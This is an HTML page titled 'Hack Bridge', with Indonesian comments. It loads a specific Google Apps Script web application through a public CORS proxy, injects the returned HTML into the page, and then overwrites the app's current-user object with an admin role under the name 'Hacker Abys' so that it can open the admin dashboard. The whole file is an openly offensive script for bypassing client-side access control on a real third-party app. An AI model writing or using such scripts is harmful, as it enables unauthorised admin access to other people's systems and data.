<!DOCTYPE html>
<html>
<head>
    <title>Hack Bridge</title>
    <style>body { background: #111; color: #fff; font-family: sans-serif; padding: 20px; }</style>
</head>
<body>
    <h2>Memuat sistem asli dari Google Script...</h2>
    <div id="hasil">Tunggu sebentar...</div>

    <script>
        // URL Google Script asli yang lo temuin di GitHub
        var targetUrl = "https://script.google.com/macros/s/AKfycbx76rVnxEfS5UHYSUOF5lq7hhzLPApUPsnd59S7PnN9JgSnlNJIR57eIuAFITFf0Xg-uQ/exec";

        // Kita pakai proxy biar nggak kena blokir CORS (beda domain)
        var proxyUrl = "https://api.allorigins.win/raw?url=" + encodeURIComponent(targetUrl);

        fetch(proxyUrl)
            .then(response => response.text())
            .then(html => {
                // Hapus script Google bawaan yang bikin error, lalu kita eksekusi HTML-nya
                document.body.innerHTML = html;
                
                // Tunggu setengah detik biar UI-nya ke-load, baru kita hack
                setTimeout(function() {
                    try {
                        // SUNTIKKAN ROLE ADMIN LANGSUNG KE DALAM SISTEM
                        APP.currentUser = { role: "admin", id: "admin", namaLengkap: "Hacker Abys" };
                        
                        // Panggil halaman dashboard
                        loadPage('dashboard');
                        
                        alert("BOOM! Berhasil masuk Dashboard Admin!");
                    } catch (e) {
                        alert("Gagal inject, cek console. Error: " + e.message);
                    }
                }, 500);
            })
            .catch(err => {
                document.getElementById('hasil').innerHTML = "Gagal memuat: " + err;
            });
    </script>
</body>
</html>
